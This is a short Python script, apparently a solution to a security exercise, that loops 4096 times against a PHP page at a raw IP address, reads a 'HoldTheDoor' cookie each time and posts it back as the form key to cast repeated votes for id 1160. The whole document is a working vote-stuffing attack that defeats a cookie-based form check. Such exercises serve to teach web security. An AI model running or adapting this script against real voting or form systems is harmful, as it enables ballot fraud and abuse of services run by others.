#!/usr/local/bin/python3
import requests

url = "http://158.69.76.135/level1.php"
sesion = requests.Session()
for i in range(1, 4097):
        r = sesion.get(url)
        cookie = dict(sesion.cookies)
        parametros_del_form = {'id': '1160', 'holdthedoor': 'Submit', 'key': cookie['HoldTheDoor']}
        respuesta = sesion.post(url, parametros_del_form)
